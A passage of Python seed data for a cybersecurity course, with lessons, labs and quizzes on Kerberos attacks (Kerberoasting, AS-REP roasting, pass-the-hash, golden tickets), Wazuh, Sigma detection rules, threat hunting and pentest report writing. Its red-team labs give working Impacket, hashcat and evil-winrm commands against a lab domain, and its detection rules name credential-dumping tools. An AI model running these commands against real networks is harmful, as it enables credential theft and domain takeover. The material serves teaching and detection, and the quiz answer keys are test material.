3. Client → KDC: TGS-REQ (Ticket Granting Service Request)
   "Give me a service ticket for MSSQLSvc/dc01.north.local:1433"
   [Presents TGT]

4. KDC → Client: TGS-REP (Ticket Granting Service Reply)
   "Here is your service ticket, encrypted with the SERVICE ACCOUNT'S HASH"

5. Client → Service: AP-REQ
   [Presents service ticket — service decrypts with its own hash]
```

### Kerberoasting

**Concept:** Any authenticated domain user can request a TGS for any SPN. The ticket is encrypted with the service account's NTLM hash. If the service account has a weak password, you crack it offline.

```bash
# Find all SPNs
GetUserSPNs.py north.sevenkingdoms.local/jon.snow:KingInTheNorth -dc-ip 192.168.56.11

# Request all service tickets (kerberoasting)
GetUserSPNs.py north.sevenkingdoms.local/jon.snow:KingInTheNorth -dc-ip 192.168.56.11 -request

# Request specific SPN
GetUserSPNs.py north.sevenkingdoms.local/jon.snow:KingInTheNorth -dc-ip 192.168.56.11 -request-user sql_svc

# Output: $krb5tgs$23$... hash ready for hashcat
```

**Crack with hashcat:**
```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
# -m 13100 = Kerberos TGS-REP (RC4-HMAC)
# -m 19600 = Kerberos TGS-REP (AES128-CTS-HMAC-SHA1-96)
# -m 19700 = Kerberos TGS-REP (AES256-CTS-HMAC-SHA1-96)
```

### AS-REP Roasting

**Concept:** Users with `DONT_REQ_PREAUTH` set don't require pre-authentication. An unauthenticated attacker can request an AS-REP and crack the hash offline.

```bash
# Without credentials (offline enumeration using usernames only)
GetNPUsers.py north.sevenkingdoms.local/ -no-pass \\
    -usersfile usernames.txt -dc-ip 192.168.56.11

# With credentials (enumerate all vulnerable users)
GetNPUsers.py north.sevenkingdoms.local/jon.snow:KingInTheNorth \\
    -dc-ip 192.168.56.11 -request

# Output: $krb5asrep$23$... hash
hashcat -m 18200 asrep_hashes.txt rockyou.txt --force
```

### Pass-the-Hash (PtH)

**Concept:** Windows NTLM authentication accepts the password hash directly — you don't need to crack it. Use the NTLM hash as the password.

```bash
# PtH with Evil-WinRM
evil-winrm -i 192.168.56.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:8f43d731c2abcdef...'

# PtH with CrackMapExec
crackmapexec smb 192.168.56.0/24 -u administrator -H 'NTLM_HASH' --local-auth

# PtH with Impacket psexec
psexec.py -hashes ':NTLM_HASH' administrator@192.168.56.10
```

### Golden Ticket Attack

**Concept:** If you have the `krbtgt` account hash (from DCSync), you can forge any TGT for any user for any service — indefinitely.

```bash
# Dump krbtgt hash
secretsdump.py north.sevenkingdoms.local/administrator:password@192.168.56.11

# Create golden ticket (Impacket)
ticketer.py -nthash KRBTGT_HASH \\
    -domain-sid S-1-5-21-XXXX \\
    -domain north.sevenkingdoms.local \\
    -user-id 500 administrator

# Use the ticket
export KRB5CCNAME=/tmp/administrator.ccache
wmiexec.py -k -no-pass administrator@dc01.north.sevenkingdoms.local
```
""",
            lab_guide_md="""## Lab: Kerberoasting on GOAD

### Exercise 1 — Find Kerberoastable SPNs
```bash
GetUserSPNs.py north.sevenkingdoms.local/jon.snow:KingInTheNorth \\
    -dc-ip 192.168.56.11
```
Document: SPN name, user account, when password was last set.

### Exercise 2 — Request and Crack TGS
```bash
# Request ticket
GetUserSPNs.py north.sevenkingdoms.local/jon.snow:KingInTheNorth \\
    -dc-ip 192.168.56.11 -request -outputfile kerberoast.txt

# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# If cracked: document the service account and password
```

### Exercise 3 — AS-REP Roasting
```bash
GetNPUsers.py north.sevenkingdoms.local/jon.snow:KingInTheNorth \\
    -dc-ip 192.168.56.11 -request -format hashcat -outputfile asrep.txt

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Exercise 4 — Pass-the-Hash with the Cracked Credential
```bash
# Get NTLM hash of cracked password
echo -n "crackedpassword" | iconv -t utf-16le | openssl md4

# Use hash for lateral movement
crackmapexec smb 192.168.56.0/24 -u sql_svc -H 'NTLM_HASH'

# WinRM access
evil-winrm -i 192.168.56.10 -u sql_svc -H 'NTLM_HASH'
```

### Mastery Check
- [ ] Identified at least 1 Kerberoastable SPN
- [ ] Successfully cracked the TGS hash
- [ ] Identified at least 1 AS-REP Roastable user
- [ ] Used the cracked/dumped hash for Pass-the-Hash lateral movement
- [ ] Documented the attack chain with evidence (screenshots/command output)
""",
            assessment_md="""## Self-Assessment
1. Why can any domain user perform Kerberoasting (it requires no special privileges)?
2. What is the difference between Kerberoasting and AS-REP Roasting?
3. How does Pass-the-Hash avoid the need to crack a password?
4. What does a Golden Ticket provide an attacker that a regular TGT does not?
5. Which hash type does hashcat module -m 18200 crack?
""",
            real_world_md="""## Real-World Context

**Real breach:** The 2020 SolarWinds breach used Kerberos ticket manipulation (Golden SAML) to move laterally through Azure AD. Understanding Kerberos is essential for both red and blue teams.

**Detection:** Windows Event IDs 4769 (TGS-REP), 4768 (TGT-REP). Kerberoasting is detectable via RC4 cipher usage when AES is default — Wazuh detects this pattern. Sigma rule `win_kerberoasting.yml`.

**Certification:** Kerberoasting and PtH are mandatory skills for OSCP, eCPPT, PNPT, and CRTP.
""",
        )
        all_topics.append(t)
        _questions(t, sa_red.id, [
            ("Why is Kerberoasting difficult to prevent without changing the Kerberos protocol design?",
             ["It requires administrator privileges to request service tickets", "Any authenticated domain user can legitimately request service tickets for any SPN — the attack abuses this legitimate functionality", "The NTLM hash used is non-exportable and can only be used within the domain", "Kerberos pre-authentication prevents the attack"],
             1, "Requesting a TGS for an SPN is a standard Kerberos operation available to all domain users. The attack occurs offline after obtaining the ticket. Prevention focuses on enforcing strong passwords for service accounts and AES encryption.", 3),
            ("hashcat -m 18200 is used to crack which type of hash?",
             ["Kerberos TGS-REP (Kerberoasting)", "Kerberos AS-REP (AS-REP Roasting)", "NTLM pass-the-hash", "MS-CHAPv2 NTLMv2"],
             1, "Hashcat module 18200 cracks Kerberos AS-REP etype 23 (RC4-HMAC) hashes, obtained via AS-REP Roasting. Module 13100 is used for Kerberoasting (TGS-REP).", 2),
            ("An attacker has obtained the krbtgt account NTLM hash via DCSync. Which attack does this enable?",
             ["AS-REP Roasting any domain user", "Creating a forged TGT (Golden Ticket) that grants access to any service as any user", "Dumping all user NTLM hashes from memory", "Bypassing MFA on VPN authentication"],
             1, "The krbtgt hash is used to sign TGTs. Possessing it allows forging unlimited, valid TGTs (Golden Tickets) for any user and any service for the lifetime of the krbtgt password.", 4),
        ])

        # ================================================================
        # PILLAR 5: BLUE TEAM OPERATIONS
        # ================================================================

        t = _topic(
            skill_area_id=sa_blue.id, week_id=week_objs[7].id,
            title="SIEM Fundamentals — Wazuh & Windows Event IDs",
            slug="siem-wazuh-windows-events",
            description="Deploy Wazuh, understand critical Windows Event IDs, configure log sources, and build your first detection rule.",
            difficulty=3, estimated_minutes=120,
            theory_md="""## SIEM and Log Analysis: The Defender's Command Centre

A SIEM (Security Information and Event Management) system aggregates logs from across your infrastructure and applies detection rules to identify threats in real-time.

### Wazuh Architecture

```
┌─────────────────────────────────────────────┐
│              Wazuh Manager (Server)           │
│  ┌──────────────┐  ┌───────────────────────┐ │
│  │ Analysis     │  │ Elasticsearch/OpenSearch│ │
│  │ Engine       │  │ (Event Storage)        │ │
│  │ (Rules/ML)   │  └───────────────────────┘ │
│  └──────────────┘  ┌───────────────────────┐ │
│                    │ Kibana/Dashboard       │ │
│                    └───────────────────────┘ │
└─────────────────────────────────────────────┘
         ↑ Agents send encrypted events ↑
    ┌──────────┐  ┌──────────┐  ┌──────────┐
    │ Windows  │  │  Linux   │  │  macOS   │
    │ Agent    │  │  Agent   │  │  Agent   │
    └──────────┘  └──────────┘  └──────────┘
```

### Critical Windows Event IDs

| Event ID | Description | Attack Relevance |
|----------|------------|-----------------|
| **4624** | Successful logon | Lateral movement tracking |
| **4625** | Failed logon | Brute force detection |
| **4648** | Logon with explicit credentials (runas) | Credential abuse |
| **4672** | Special privileges assigned | Privilege escalation |
| **4688** | New process created | LOLBin execution, malware |
| **4697** | Service installed | Persistence mechanism |
| **4698** | Scheduled task created | Persistence mechanism |
| **4719** | System audit policy changed | Tamper with logging |
| **4720** | User account created | Backdoor account |
| **4732** | User added to security group | Privilege escalation |
| **4768** | Kerberos TGT request | Kerberoasting, PtH |
| **4769** | Kerberos service ticket request | Kerberoasting |
| **4776** | NTLM authentication | Pass-the-Hash |
| **7045** | New service installed | Malware installation |

**Logon Types:**
- Type 2 = Interactive (console login)
- Type 3 = Network (SMB, file share)
- Type 4 = Batch (scheduled task)
- Type 5 = Service (service account)
- Type 10 = Remote Interactive (RDP)

### Sysmon — Enhanced Logging

Sysmon (System Monitor) enriches Windows logging significantly:
```
Event ID 1: Process Create (with command line, hashes, parent)
Event ID 3: Network Connection
Event ID 6: Driver Loaded
Event ID 7: Image Loaded (DLL)
Event ID 10: Process Access (e.g., LSASS read → credential dumping)
Event ID 11: File Create
Event ID 13: Registry Value Set
Event ID 22: DNS Query
Event ID 25: Process Tampering
```

### Wazuh Rule Structure

```xml
<!-- Example: Detect scheduled task creation -->
<rule id="92200" level="10">
  <if_group>windows</if_group>
  <field name="win.system.eventID">^4698$</field>
  <description>Windows: Scheduled task created - possible persistence</description>
  <mitre>
    <id>T1053.005</id>
  </mitre>
  <group>windows,persistence,</group>
</rule>
```

**Rule Levels:**
- 0-3: Low priority, informational
- 4-6: Low-medium (may indicate suspicious activity)
- 7-11: High priority (investigate)
- 12-15: Critical (immediate response)
""",
            lab_guide_md="""## Lab: Configure Wazuh and Detect an AD Attack

### Prerequisites
- Wazuh Manager running (VM or local Docker)
- Windows GOAD VM with Wazuh agent installed

### Exercise 1 — Verify Log Collection
```bash
# On Wazuh Manager
tail -f /var/ossec/logs/alerts/alerts.json | python3 -m json.tool | head 100

# Check agent connection
/var/ossec/bin/agent_control -l
```

### Exercise 2 — Generate Telemetry (Attacker Side)
On Kali, perform a failed login against GOAD DC:
```bash
crackmapexec smb 192.168.56.11 -u wronguser -p wrongpass
```

Then check Wazuh for Event ID 4625:
```bash
grep '4625' /var/ossec/logs/alerts/alerts.json | python3 -m json.tool
```

### Exercise 3 — Write a Custom Wazuh Rule
```xml
<!-- Save to /var/ossec/etc/rules/local_rules.xml -->
<group name="local,windows,">
  <rule id="100100" level="12">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4625$</field>
    <same_source_ip />
    <description>Multiple failed Windows logons from same IP — possible brute force</description>
    <options>no_full_log</options>
    <mitre>
      <id>T1110</id>
    </mitre>
  </rule>
</group>
```

```bash
# Restart Wazuh and verify rule
systemctl restart wazuh-manager
/var/ossec/bin/wazuh-logtest  # Test rule interactively
```

### Exercise 4 — Kerberoasting Detection
Perform Kerberoasting from Kali:
```bash
GetUserSPNs.py north.sevenkingdoms.local/jon.snow:KingInTheNorth -dc-ip 192.168.56.11 -request
```

Look for Event ID 4769 with Ticket Options 0x40810000 and Encryption Type 0x17 (RC4) in Wazuh.

### Mastery Check
- [ ] Wazuh receives events from at least 2 sources (Linux + Windows)
- [ ] Created custom rule for 4625 (failed logon)
- [ ] Detected a Kerberoasting attempt in Wazuh alerts
- [ ] Identified Logon Type 3 vs Type 10 in event logs
""",
            assessment_md="""## Self-Assessment
1. What does Windows Event ID 4688 log and why is it important for threat detection?
2. How does Sysmon Event ID 10 help detect credential dumping?
3. What is the significance of Logon Type 10 in Windows Event ID 4624?
4. What Kerberos encryption type indicates a Kerberoasting attempt in Event 4769?
5. What does Wazuh rule level 12 indicate?
""",
            real_world_md="""## Real-World Context

**SOC Analyst role:** Tier 1-2 analysts primarily work in a SIEM dashboard. Knowing which Event IDs matter and what they indicate determines how fast you can triage alerts.

**DFIR:** During an incident response, Windows Event Logs are the primary artifact. Knowing Event 4624 Logon Type 3 = network authentication helps reconstruct lateral movement chains.

**Certification:** SC-200 (Microsoft Security Operations Analyst) and Splunk Core Certified User both test SIEM/log analysis skills. BTL1 (Blue Team Labs Level 1) is specifically designed around log analysis.
""",
        )
        all_topics.append(t)
        _questions(t, sa_blue.id, [
            ("Windows Event ID 4769 is logged with Ticket Options 0x40810000 and Ticket Encryption Type 0x17. What attack does this indicate?",
             ["AS-REP Roasting", "Pass-the-Hash using NTLM", "Kerberoasting (RC4 service ticket request)", "Golden Ticket forgery"],
             2, "Event 4769 is a TGS-REP (service ticket request). Encryption type 0x17 = RC4-HMAC, which is requested by Kerberoasting tools. Modern AD should use AES (0x12/0x11). RC4 requests for RC4-capable accounts are a Kerberoasting indicator.", 3),
            ("Which Windows Event ID would you monitor to detect a new user account being added to the Domain Admins group?",
             ["4720 (User Account Created)", "4724 (Password Reset)", "4732 (Member Added to Security Group)", "4672 (Special Privileges Assigned)"],
             2, "Event ID 4732 is logged when a member is added to a security-enabled local group. For domain groups, Event 4728 covers global groups. Both indicate privilege changes that may represent attacker persistence.", 2),
            ("Sysmon Event ID 10 (ProcessAccess) is logged with TargetImage 'C:\\Windows\\System32\\lsass.exe'. What attack is likely occurring?",
             ["Process hollowing for code injection", "Credential dumping from LSASS memory (e.g., Mimikatz, procdump)", "DLL search-order hijacking", "AppLocker bypass via trusted binary"],
             1, "LSASS (Local Security Authority Subsystem Service) stores credential hashes in memory. Tools like Mimikatz, Procdump, and ProcDump access LSASS to dump credentials. Sysmon 10 with TargetImage=lsass.exe is the primary detection indicator.", 2),
        ])

        # ─── Blue Team Topic 2 ──────────────────────────────────────────
        t = _topic(
            skill_area_id=sa_blue.id, week_id=week_objs[8].id,
            title="Sigma Rule Authoring & Detection Engineering",
            slug="sigma-rule-authoring",
            description="Write production-quality Sigma rules, understand the detection lifecycle, and implement detection-as-code principles.",
            difficulty=4, estimated_minutes=130,
            theory_md="""## Sigma: The SIEM-Agnostic Detection Language

Sigma is to detection rules what Snort is to IDS signatures — a vendor-neutral format that compiles to any SIEM (Splunk, Elastic, QRadar, Wazuh, Sentinel, etc.).

### Sigma Rule Structure

```yaml
title: Kerberoasting Activity Detection
id: 5f08d000-c00c-4f8e-95d5-f2c07b3d9fce
status: stable
description: |
    Detects Kerberoasting activity by identifying TGS service ticket requests
    using RC4 encryption (0x17) which is abnormal in modern AD environments.
references:
    - https://attack.mitre.org/techniques/T1558/003/
    - https://adsecurity.org/?p=2544
author: Purple Team Operator
date: 2024/01/15
tags:
    - attack.credential_access
    - attack.t1558.003
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'
        ServiceName|endswith:
            - '$'
    filter:
        ServiceName: 'krbtgt'
    condition: selection and not filter
falsepositives:
    - Legacy applications that require RC4
    - Older Windows systems (pre-2012)
level: high
```

### Detection Logic Operators

```yaml
# Simple AND condition
detection:
    selection:
        EventID: 4624
        LogonType: 10
    condition: selection

# OR within a field
detection:
    selection:
        CommandLine|contains:
            - 'mimikatz'
            - 'sekurlsa'
            - 'lsadump'
    condition: selection

# Keyword search (no field)
detection:
    keywords:
        - 'password'
        - 'credential'
    condition: keywords

# NOT condition (filter)
detection:
    selection:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains: 'EncodedCommand'
    filter:
        ParentImage|endswith: '\\Update.exe'
    condition: selection and not filter

# Aggregate conditions (count)
detection:
    failed_logon:
        EventID: 4625
    timeframe: 1m
    condition: failed_logon | count(TargetUserName) by IpAddress > 10
```

### Field Modifiers

| Modifier | Description | Example |
|---------|------------|---------|
| `contains` | Substring match | `CommandLine\\|contains: 'base64'` |
| `startswith` | Prefix match | `Image\\|startswith: 'C:\\'` |
| `endswith` | Suffix match | `Image\\|endswith: '.dll'` |
| `re` | Regex match | `CommandLine\\|re: '[A-Z]{10,}'` |
| `all` | All items must match | `CommandLine\\|contains\\|all:` |
| `windash` | Match both / and - | `CommandLine\\|windash\\|contains: '-enc'` |

### The Detection Engineering Lifecycle

```
1. Threat Hypothesis
   └── "Attackers use PowerShell with encoded commands to evade logging"

2. Research
   └── MITRE ATT&CK: T1059.001, T1027
   └── Review public Sigma rules for this technique

3. Write Rule
   └── Define detection logic in Sigma YAML

4. Validate
   └── Test against known-good and known-bad logs
   └── `sigma check --target splunk rule.yml`

5. Tune (Reduce False Positives)
   └── Add filter conditions for legitimate use cases

6. Deploy
   └── Convert to SIEM query: `sigma convert -t wazuh rule.yml`

7. Monitor & Improve
   └── Track rule performance: alerts, FP rate, missed detections
```

### Converting Sigma Rules
```bash
# Install sigma-cli
pip install sigma-cli

# Convert to Wazuh
sigma convert -t wazuh win_kerberoasting.yml

# Convert to Splunk
sigma convert -t splunk win_kerberoasting.yml

# Convert to Elastic
sigma convert -t elastic-ecs win_kerberoasting.yml
```

### Detection Coverage Matrix

Map your Sigma rules to MITRE ATT&CK:
- Plot covered techniques in MITRE Navigator
- Identify gaps (uncovered techniques)
- Prioritise based on threat actor TTPs targeting your sector
""",
            lab_guide_md="""## Lab: Write and Deploy 5 Sigma Rules

### Exercise 1 — Kerberoasting Detection
Write a Sigma rule detecting Event 4769 with RC4 encryption:
```yaml
title: Kerberoasting - RC4 TGS Request
id: <generate UUID>
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'
    filter_krbtgt:
        ServiceName: 'krbtgt'
    condition: selection and not filter_krbtgt
level: high
tags:
    - attack.t1558.003
```

### Exercise 2 — LSASS Memory Access
```yaml
title: LSASS Memory Access - Credential Dumping
logsource:
    product: windows
    category: process_access
    # Requires Sysmon Event ID 10
detection:
    selection:
        TargetImage|endswith: '\\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'
            - '0x1038'
            - '0x1fffff'
    filter_legitimate:
        SourceImage|endswith:
            - '\\MsMpEng.exe'
            - '\\WerFault.exe'
    condition: selection and not filter_legitimate
level: critical
tags:
    - attack.t1003.001
```

### Exercise 3 — Scheduled Task Persistence
```yaml
title: Scheduled Task Created via Command Line
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\\schtasks.exe'
        CommandLine|contains: '/create'
    condition: selection
level: medium
tags:
    - attack.t1053.005
```

### Exercise 4 — Convert and Test
```bash
# Convert rule to Wazuh format
sigma convert -t wazuh kerberoasting_rule.yml

# Test against log sample
sigma test kerberoasting_rule.yml --test-data sample_logs.json
```

### Mastery Check
- [ ] Written 5 Sigma rules covering different MITRE techniques
- [ ] Each rule has proper `id`, `status`, `tags`, `logsource`, `detection`, `level`
- [ ] At least 2 rules include filter conditions to reduce false positives
- [ ] Rules converted to at least 2 SIEM formats
- [ ] Coverage plotted on MITRE ATT&CK Navigator
""",
            assessment_md="""## Self-Assessment
1. What is the purpose of the Sigma `condition` field?
2. How does the `|contains` modifier differ from `|startswith`?
3. Why is it important to include filter conditions in detection rules?
4. What is the detection engineering lifecycle and why does it matter?
5. How do you map your detection rules to MITRE ATT&CK coverage?
""",
            real_world_md="""## Real-World Context

**Industry demand:** Detection engineering is one of the fastest-growing specialisations in cybersecurity. Companies like CrowdStrike, Elastic, and Palo Alto publish Sigma rules to the community.

**Sigma repo:** The official Sigma repository (github.com/SigmaHQ/sigma) has 3,000+ community rules. Contributing quality rules is an excellent portfolio piece.

**Certification:** Detection engineering skills are assessed in GREM (GIAC Reverse Engineering Malware), GCIA (Intrusion Analyst), and Elastic's Certified Security Analytics Engineer.
""",
        )
        all_topics.append(t)
        _questions(t, sa_blue.id, [
            ("In a Sigma rule, what does the condition 'selection and not filter' mean?",
             ["Match if any of the selection fields match OR any filter fields don't match", "Match if all selection criteria are met AND none of the filter criteria are met (exclude known-good)", "Match only if the filter is empty", "Match if the selection is empty and the filter has content"],
             1, "'selection and not filter' means: trigger the rule when the selection condition matches, but only if the filter condition does NOT match. This is the standard pattern for reducing false positives by excluding known-legitimate activity.", 2),
            ("A Sigma rule uses `CommandLine|contains|all: ['powershell', '-enc', '-nop']`. When does this rule match?",
             ["When CommandLine contains any of the three strings", "When CommandLine contains all three strings simultaneously", "When CommandLine starts with 'powershell'", "When CommandLine is exactly 'powershell -enc -nop'"],
             1, "The |all modifier requires ALL items in the list to be present in the field. Without |all, it would be an OR match (any). This detects PowerShell with encoded command (-enc) and no profile (-nop) together.", 2),
            ("Which Sigma logsource configuration targets Sysmon process creation events (Event ID 1)?",
             ["logsource: product: windows / service: sysmon / eventid: 1", "logsource: product: windows / category: process_creation", "logsource: product: sysmon / service: windows", "logsource: category: windows_process / type: creation"],
             1, "Sigma uses the abstract logsource category 'process_creation' for Sysmon Event ID 1. The Sigma backend handles the actual EventID mapping, making rules portable across Sysmon and other process creation log sources.", 2),
        ])

        # ================================================================
        # PILLAR 5 (cont.): THREAT HUNTING
        # ================================================================

        t = _topic(
            skill_area_id=sa_blue.id, week_id=week_objs[9].id,
            title="Threat Hunting — TaHiTI & PEAK Frameworks",
            slug="threat-hunting-frameworks",
            description="Conduct structured threat hunts using TaHiTI and PEAK methodologies, build hypotheses from threat intel, and validate findings.",
            difficulty=4, estimated_minutes=120,
            theory_md="""## Threat Hunting: Proactive Defence

Threat hunting is the proactive, iterative process of searching through networks and systems to detect and isolate advanced threats that evade automated security solutions.

### Why Threat Hunting?

**Dwell time problem:** The average time an attacker goes undetected in an enterprise is 207 days (IBM Cost of a Data Breach Report). Automated detection only catches known signatures. Hunters look for anomalies and TTPs.

### TaHiTI Framework (Targeted Hunting integrating Threat Intelligence)

```
Phase 1: INITIATE
  ├── Define hunt scope and objective
  ├── Identify available data sources
  └── Select hypothesis from threat intelligence

Phase 2: HUNT
  ├── Develop hunt hypothesis
  │     "Based on threat intelligence about APT29, I expect to see
  │      T1059.001 (PowerShell) with base64-encoded payloads"
  ├── Collect relevant data
  ├── Execute hunt (queries, ML, statistical analysis)
  └── Triage anomalies

Phase 3: FINALISE
  ├── Document findings
  ├── Convert detections → Sigma rules (if new)
  ├── Update threat model
  └── Report to stakeholders
```

### PEAK Framework (Prepare, Execute, Act with Knowledge)

```
PREPARE:
  - Define hypothesis
  - Identify data sources and their quality
  - Design hunt queries/procedures

EXECUTE:
  - Run queries and collect data
  - Identify anomalies and outliers
  - Investigate leads

ACT WITH KNOWLEDGE:
  - Determine if threat is confirmed, possible, or not found
  - Create/improve detection rules
  - Improve data collection if gaps found
  - Document and share learnings
```

### Building Hunt Hypotheses

Good hypotheses follow this formula:
```
"Based on [threat intelligence/TTPs/anomaly],
 I believe [attacker behaviour] is occurring,
 which would manifest as [observable indicator]
 in [data source]."

Example:
"Based on MITRE ATT&CK T1071.001 (Web Protocols C2),
 I believe an implant is beaconing to C2 via HTTPS,
 which would manifest as regular intervals of small HTTPS POST requests
 in Zeek/proxy logs to domains registered <30 days ago."
```

### Practical Hunt Techniques

**Statistical anomaly detection:**
```python
# In Elasticsearch/Kibana or Python
# Find processes with unusual parent-child relationships
# e.g., winword.exe → cmd.exe → powershell.exe

from collections import Counter
import json

# Load process creation events
events = [json.loads(l) for l in open('process_events.json')]

# Count parent→child relationships
pairs = Counter()
for e in events:
    pairs[(e['ParentImage'], e['Image'])] += 1

# Find rare pairs (< 5 occurrences) — potential LOLBin abuse
for (parent, child), count in pairs.items():
    if count < 5:
        print(f"RARE: {parent} → {child} ({count}x)")
```

**Long-tail analysis:**
- Sort by frequency — the "long tail" (rare events) is where threats hide
- Common: svchost.exe spawning known services (hundreds per day)
- Rare: svchost.exe spawning cmd.exe (2 instances — investigate)

**Beaconing detection:**
- Regular intervals of outbound connections to the same host
- Jitter: attacker tools add random delay — still detectable as periodic
- Tools: RITA (Real Intelligence Threat Analytics), DeepBlueCLI
""",
            lab_guide_md="""## Lab: Conduct a Threat Hunt on GOAD Attack Data

### Scenario: You suspect an attacker has performed lateral movement in the GOAD environment. You have Wazuh alerts from the past 24 hours.

### Exercise 1 — Build Your Hypothesis
Write a formal hypothesis:
```
Based on: [observation or intel]
I believe: [attacker behaviour]
Evidence would appear as: [observable]
In data source: [log source]
```

### Exercise 2 — Query for Anomalous Process Creation
```bash
# In Wazuh/Elasticsearch
# Find processes spawned by Office applications
grep -h '"Image"' /var/ossec/logs/alerts/alerts.json \\
    | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        e = json.loads(line)
        parent = e.get('data',{}).get('win',{}).get('eventdata',{}).get('parentImage','')
        child = e.get('data',{}).get('win',{}).get('eventdata',{}).get('image','')
        if any(x in parent.lower() for x in ['winword','excel','outlook']):
            print(f'SUSPICIOUS: {parent} → {child}')
    except: pass
"
```

### Exercise 3 — Beaconing Detection
```bash
# Extract DNS queries and look for high-frequency domains
grep '"dns"' /var/ossec/logs/archives/archives.json \\
    | python3 -c "
import sys, json
from collections import Counter
domains = Counter()
for line in sys.stdin:
    try:
        e = json.loads(line)
        domain = e.get('data',{}).get('dns',{}).get('query','')
        if domain:
            domains[domain] += 1
    except: pass

# High-frequency external domains may be C2
for d, c in domains.most_common(20):
    print(f'{c:6d}  {d}')
"
```

### Exercise 4 — Document Findings
Create a hunt report with:
- Hypothesis
- Data sources used
- Queries/techniques applied
- Findings (confirmed, possible, not found)
- New detection rules created
- Gaps identified (missing log sources)

### Mastery Check
- [ ] Wrote a formal threat hunt hypothesis using TaHiTI structure
- [ ] Ran at least 3 different hunt queries
- [ ] Identified at least 1 anomalous process parent-child relationship
- [ ] Converted a finding into a Sigma rule
- [ ] Produced a 1-page hunt report
""",
            assessment_md="""## Self-Assessment
1. What is the difference between threat hunting and alert response?
2. How does long-tail analysis help find threats hiding in normal traffic?
3. What is a good threat hunt hypothesis template?
4. How does PEAK differ from TaHiTI in approach?
5. What log source would you query to detect C2 beaconing?
""",
            real_world_md="""## Real-World Context

**Industry:** Threat hunting teams at companies like Microsoft DART, CrowdStrike Falcon OverWatch, and Mandiant conduct hunts based on current threat intelligence, specifically targeting adversary TTPs known to target the client's industry.

**Career path:** Threat hunter is a senior SOC role (typically Tier 3). Starting as a detection engineer and learning to write and hunt with Sigma rules is the most direct path.

**Tools:** RITA (Real Intelligence Threat Analytics), Chainsaw (Windows log parser), Velociraptor (EDR/hunt platform), and Elastic SIEM are industry-standard hunt platforms.
""",
        )
        all_topics.append(t)
        _questions(t, sa_blue.id, [
            ("A threat hunter wants to find potential C2 beaconing in DNS logs. Which analytical technique is most appropriate?",
             ["Search for DNS queries containing known malware domain names from threat feeds", "Detect regular time-interval DNS queries to the same external domain (beaconing analysis)", "Look for DNS queries with record types other than A and AAAA", "Monitor for NXDOMAIN responses exceeding 100 per minute"],
             1, "Beaconing analysis looks for regular periodic intervals of communication — a hallmark of C2 implants. Even with jitter, the pattern is detectable via statistical analysis of inter-request timing.", 3),
            ("In the TaHiTI framework, which phase produces Sigma rules as an output?",
             ["Initiate (before the hunt begins)", "Hunt (during the execution)", "Finalise (after findings are confirmed)", "There is no output of Sigma rules in TaHiTI"],
             2, "The Finalise phase converts confirmed threat detections into codified rules (Sigma, Suricata, YARA), updates the threat model, and reports to stakeholders — closing the loop between hunting and detection.", 2),
            ("Long-tail analysis in threat hunting examines which portion of event frequency distribution?",
             ["The most frequent events (top 10 by volume)", "The least frequent events (rare anomalies at the tail of the distribution)", "Events occurring at exactly average frequency", "Events with the highest severity score"],
             1, "Long-tail analysis focuses on rare events — the statistical 'tail' of a frequency distribution. Adversary activity typically appears as rare deviations from the normal baseline, while the most common events are legitimate routine operations.", 2),
        ])

        # ================================================================
        # PILLAR 6: PROFESSIONAL DEVELOPMENT
        # ================================================================

        t = _topic(
            skill_area_id=sa_prof.id, week_id=week_objs[1].id,
            title="Security Report Writing & Professional Communication",
            slug="security-report-writing",
            description="Write executive summaries, technical findings, CVSS scoring, remediation recommendations, and present findings to stakeholders.",
            difficulty=2, estimated_minutes=80,
            theory_md="""## Professional Security Report Writing

A security report is the primary deliverable of any penetration test or security assessment. Your technical skills mean nothing if you cannot communicate findings clearly to different audiences.

### Report Structure

```
1. Executive Summary (1-2 pages — for management)
   ├── Engagement scope and dates
   ├── Overall risk rating
   ├── Top 3-5 critical findings (non-technical language)
   └── Immediate recommended actions

2. Technical Summary
   ├── Methodology overview
   ├── Testing environment details
   └── Risk rating breakdown (Critical/High/Medium/Low/Informational)

3. Findings (one section per vulnerability)
   ├── Title (clear, specific)
   ├── Severity Rating (CVSS v3.1 score)
   ├── Affected Systems/Components
   ├── Description (technical detail)
   ├── Evidence (screenshots, command output)
   ├── Business Impact
   ├── Remediation Recommendation
   └── References (CVE, CWE, OWASP)

4. Appendices
   ├── Scope and Targets
   ├── Tools Used
   ├── CVSS Score Calculations
   └── Raw Scan Data
```

### CVSS v3.1 Scoring

**Base Score Metrics:**
| Metric | Options |
|--------|---------|
| Attack Vector (AV) | Network(N), Adjacent(A), Local(L), Physical(P) |
| Attack Complexity (AC) | Low(L), High(H) |
| Privileges Required (PR) | None(N), Low(L), High(H) |
| User Interaction (UI) | None(N), Required(R) |
| Scope (S) | Unchanged(U), Changed(C) |
| Confidentiality (C) | None(N), Low(L), High(H) |
| Integrity (I) | None(N), Low(L), High(H) |
| Availability (A) | None(N), Low(L), High(H) |

**Kerberoasting Example:**
```
AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
= CVSS 8.8 (High)
```

Rationale: Network-accessible, low complexity, requires low privileges, no user interaction, high impact on C/I/A.

### Writing Good Findings

**Bad (vague):**
> "A vulnerability was found in the Active Directory configuration that could allow an attacker to gain elevated access."

**Good (specific and actionable):**
> **Finding: Kerberoastable Service Accounts with Weak Passwords**
> 
> **Severity:** High (CVSS 8.8)
> 
> **Affected Systems:** `NORTH.SEVENKINGDOMS.LOCAL` domain — service accounts: `sql_svc`, `web_svc`
> 
> **Description:** Three service accounts with registered SPNs were found to use weak passwords (minimum 8 characters, no complexity). Any authenticated domain user can request TGS tickets for these accounts and attempt offline password cracking. During testing, the password for `sql_svc` ("Service2024!") was recovered within 3 minutes using a standard wordlist.
> 
